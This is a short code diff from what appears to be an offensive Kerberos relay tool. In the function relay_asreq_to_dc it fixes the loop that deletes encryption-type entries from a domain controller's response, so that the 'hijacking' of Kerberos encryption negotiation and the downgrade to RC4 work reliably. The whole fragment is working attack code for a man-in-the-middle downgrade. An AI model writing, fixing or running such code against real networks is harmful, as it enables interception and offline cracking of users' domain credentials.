@@ -609,7 +609,7 @@ async def relay_asreq_to_dc(data, client_ip):
             logging.warning("[!] RC4 not found in DC's supported algorithms. Downgrade to RC4 will not work")
             return response
         logging.info(f'[+] Hijacking Kerberos encryption negotiation for {username}@{domain}...')
-        for i in indexes_to_delete :
+        for i in reversed(indexes_to_delete) :
             del krb_response.root.eData[0].seq[0].padataValue.seq[i]
         krb_response[KerberosTCPHeader].len = len(bytes(krb_response[Kerberos])) 
         return bytes(krb_response[KerberosTCPHeader])
